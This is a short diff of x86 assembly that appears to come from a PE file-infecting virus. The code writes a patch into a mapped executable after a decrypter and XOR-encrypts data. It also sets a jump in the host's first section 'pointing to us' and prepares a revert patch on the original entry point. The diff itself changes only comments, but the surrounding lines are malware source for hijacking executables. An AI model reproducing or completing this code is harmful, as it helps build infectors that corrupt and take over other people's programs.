@@ -575,7 +575,12 @@ stosb
 
 ; CREATE REVERT PATCH ON OLD ENTRY POINT
 PATCHER_SIZE = 17
-; Create jmp
+; mov	edi, bi + OldENtryPoint
+; mov	eax, 4bytes
+; stosd
+; mov eax, 4bytes
+; stosd
+; ...
 mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA PointerToRawData]
 add	edi, DECRYPTER_SIZE ; After decrypter add our patch
@@ -636,7 +641,7 @@ xor	eax, [DELTA XorCrypt] ; encrypt
 stosd
 
 
-; Patch setting jump on first section pointing to us
+; PATCH SETTING JUMP ON FIRST SECTION POINTING TO US
 ; Decrypt jmp
 PATCH_DECRYPT_SIZE = 22
 PATCH_SIZE = PATCH_DECRYPT_SIZE + 5
